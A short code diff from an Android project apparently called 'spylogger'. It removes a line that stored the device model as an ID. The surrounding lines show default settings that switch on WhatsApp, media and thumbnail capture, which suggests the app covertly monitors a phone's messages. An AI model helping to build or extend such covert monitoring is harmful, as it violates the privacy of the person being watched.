@@ -2,7 +2,6 @@ package com.gravatasufoca.spylogger.dao;
 
 import android.content.Context;
 import android.database.sqlite.SQLiteDatabase;
-import android.os.Build;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.R;
@@ -66,7 +65,6 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 		configuracao.setWhatsApp(true);
 		configuracao.setMedia(true);
 		configuracao.setMiniatura(true);
-		configuracao.setIdDevice(Build.MODEL);
 
 		try {
 			getDao(Configuracao.class).create(configuracao);
